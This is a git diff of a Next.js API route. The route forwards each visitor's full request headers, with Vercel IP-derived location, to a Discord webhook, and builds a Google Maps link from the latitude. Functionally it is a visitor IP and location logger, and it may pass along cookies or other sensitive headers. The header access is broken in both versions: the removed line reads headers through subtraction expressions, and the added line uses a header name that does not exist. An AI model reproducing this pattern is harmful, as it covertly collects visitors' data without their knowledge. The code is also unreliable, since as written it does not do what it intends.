@@ -5,11 +5,17 @@ const webhookClient = new Discord.WebhookClient({
   token: process.env.DISCORD_TOKEN,
 });
 
+type Data = {
+  data: undefined | {} | unknown;
+};
+
 export default async function handler(
   req: NextApiRequest,
   res: NextApiResponse
 ) {
   try {
+    const link = `https://www.google.com/maps/place/${req.headers.xVercelIpLatitude}`
+    console.log(link)
     const webhook = await webhookClient.send({
       embeds: [
         {
@@ -17,11 +23,10 @@ export default async function handler(
           description:
             "Detalhes do Acesso:\n\r" + JSON.stringify(req.headers, null, 10),
           color: "32896",
-          url: `https://www.google.com/maps/place/${req.headers.x-vercel-ip-latitude},${req.headers.x-vercel-ip-longitude}`,
         },
       ],
     });
-    res.status(200).json({ data:"ok"    });
+    res.status(200).json({ data:link  });
   } catch (error) {
     res.status(503).json({ status: 503 });
   }
